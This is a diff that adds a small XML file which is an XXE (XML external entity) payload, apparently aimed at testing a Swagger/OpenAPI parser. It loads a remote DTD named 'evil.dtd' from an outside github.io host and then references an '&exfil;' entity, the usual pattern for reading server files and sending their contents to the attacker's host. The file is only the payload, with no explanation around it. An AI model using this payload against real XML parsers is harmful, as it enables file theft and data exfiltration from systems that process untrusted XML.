@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "https://ashwinchandra08.github.io/swagger-test/evil.dtd">
+%remote;
+]>
+<root>
+  <spec>&exfil;</spec>
+</root>
